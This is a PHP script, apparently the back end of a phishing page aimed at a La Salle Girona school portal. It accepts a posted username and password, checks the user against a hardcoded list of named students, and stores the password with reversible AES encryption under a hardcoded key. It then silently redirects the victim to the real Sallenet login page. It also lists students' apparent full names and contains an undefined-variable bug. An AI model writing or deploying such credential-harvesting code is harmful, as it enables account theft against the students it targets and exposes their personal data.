<?php

// Zona Horaria.
date_default_timezone_set("Europe/Madrid");

$usuario = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// Validación básica.
if ($usuario === '' || $password === '') {
    exit;
}

// Lista de Usuarios Permitidos (WhiteList1).
$usuarios_permitidos_classe2 = [
    "arnauculubretalbert",
    "hanyujiangjiang",
    "martibrusicasadevall",
    "alexocanacarrascal",
    "joelelviramoreno",
    "alexpedrazapiedad",
    "marcluqueteixidor",
    "gerardfreixasmatas",
    "martipuigipons",
    "ainapagesrus",
    "sergicastrorenart",
    "melanimartinezcorzo",
    "ericvilellatarres",
    "marticusipujol",
    "oriolserracruz",
    "miquelwenjiegugu",
    "pausolemolinero",
    "albertamerperez",
    "ianemiliogarciadominguez",
    "adrianpadillamenendez",
    "poldelgadograupera",
    "maxgimbernatroura"
];

// Lista de Usuarios Permitidos (WhiteList2).
$usuarios_permitidos_classe1 = [
    "",
];

// Usuario no permitido. Redirección.
if (!in_array($usuario, $usuarios_permitidos)) {
    header("Location: http://localhost/mi_error.php");
    exit;
}

// Clave Cifrada.
$clave_secreta = "xlI796y6K88z0fSL0UMOLNKt";

// Generacion de IV.
$iv = openssl_random_pseudo_bytes(16);

// Cifrado de Contraseña.
$encrypted = openssl_encrypt(
    $password,
    "AES-256-CBC",
    $clave_secreta,
    0,
    $iv
);

// Guardado de IV + Cifrado (Juntos).
$password_encrypted = base64_encode($iv . $encrypted);

try {

    // Conectar a la base de datos.
    $db = new SQLite3('/var/www/data/database.db');

    if (!$db) {
        die("No se pudo abrir la base de datos");
    }

    // Creación de la tabla si no existe.
    $db->exec("CREATE TABLE IF NOT EXISTS usuarios (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        usuario TEXT NOT NULL,
        password_hash TEXT NOT NULL,
        fecha TEXT NOT NULL
    )");

    // Insertado de Datos.
    $stmt = $db->prepare("INSERT INTO usuarios (usuario, password_hash, fecha)
                          VALUES (:usuario, :pass, :fecha)");

    $stmt->bindValue(':usuario', $usuario, SQLITE3_TEXT);
    $stmt->bindValue(':pass', $password_encrypted, SQLITE3_TEXT);
    $stmt->bindValue(':fecha', date("Y-m-d H:i:s"), SQLITE3_TEXT);

    $stmt->execute();

} catch (Exception $e) {
    // Respuesta no Visible.
}

// Redirección final
header("Location: https://lasallegirona.sallenet.org/login/index.php?loginredirect=1");
exit;

?>